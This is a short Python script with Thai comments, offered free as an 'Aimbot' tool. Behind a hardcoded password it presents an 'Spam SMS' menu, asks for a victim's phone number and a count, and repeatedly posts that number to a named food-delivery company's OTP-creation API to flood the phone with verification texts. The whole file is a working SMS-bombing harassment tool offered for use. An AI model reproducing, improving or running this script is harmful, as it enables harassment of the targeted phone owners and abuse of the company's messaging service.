#สคริปต์ Aimbot
#แจกฟรี ห้ามขาย
#แก้ไข เครดิตได้ตามบาย(❌❌)

import requests,json,time,threading,os,sys
import urllib.request, os, threading, time, random, sys
import colorama
from colorama import Fore, Style, init
#from requests_futures.sessions import FuturesSession
#from requests_futures import sessions
os.system("clear")
print("=== ล็อคอินก่อน ===")
used = input(" Username : ")
passed = input(" Password : ")
if passed == 'aimbot':
	time.sleep(2)
	os.system("clear")
	print(Fore.GREEN + "[+] ล็อคอินสำเร็จ..")
	time.sleep(2)
	os.system("clear")
	print(Fore.YELLOW + "=== Menu ===")
	print(Fore.BLUE + "[1] Spam SMS")
	io = input(Fore.GREEN + "Number Attack : ")
	if io == '1':
		os.system("clear")
	
url = "https://api2.1112.com/api/v1/otp/create"

def send(phone: str , times: int):

    payloads = {'phonenumber': f"{phone}", 'language': "th"}
    for i in range(times):
        r = requests.post(url, data=payloads)
        print(f"send to {phone} success")
        time.sleep(1)
        
print("=== SPAMER ===")
print("")
print(Fore.YELLOW + "┌─[เบอร์]")
phone_input = input("└─[$]> ")
print(Fore.RED + "┌─[จำนวน]")
times_input = int(input("└─[$]> "))
print("")
time.sleep(2)

send(phone=phone_input, times=times_input)